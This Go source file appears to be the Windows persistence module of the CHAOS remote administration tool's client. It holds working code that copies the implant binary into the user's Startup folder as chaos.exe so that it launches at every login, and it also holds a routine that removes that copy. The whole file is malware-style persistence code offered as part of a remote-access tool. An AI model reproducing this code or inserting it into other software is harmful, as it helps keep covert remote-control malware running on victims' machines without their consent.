package windows

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"os"
	"path/filepath"
)

const (
	envAppData      = "appdata"
	persistencePath = `Microsoft\Windows\Start Menu\Programs\Startup\chaos.exe`
)

func Persist(status bool, binaryPath string) error {
	switch status {
	case true:
		return enablePersistence(binaryPath)
	case false:
		return disablePersistence()
	}
	return nil
}

func enablePersistence(binaryPath string) error {
	file := fmt.Sprint(os.Getenv(envAppData), string(os.PathSeparator), persistencePath)

	if err := util.CopyFile(binaryPath, file); err != nil {
		return err
	}

	// check if file has created
	_, err := os.Stat(file)
	if err != nil {
		if os.IsNotExist(err) {
			return err
		}
		return nil
	}

	return nil
}

func disablePersistence() error {
	file := fmt.Sprint(os.Getenv(envAppData), string(os.PathSeparator), persistencePath)
	if err := os.Remove(file); err != nil {
		return err
	}
	return nil
}

func getFileFromPath(path string) string {
	return filepath.Base(path)
}
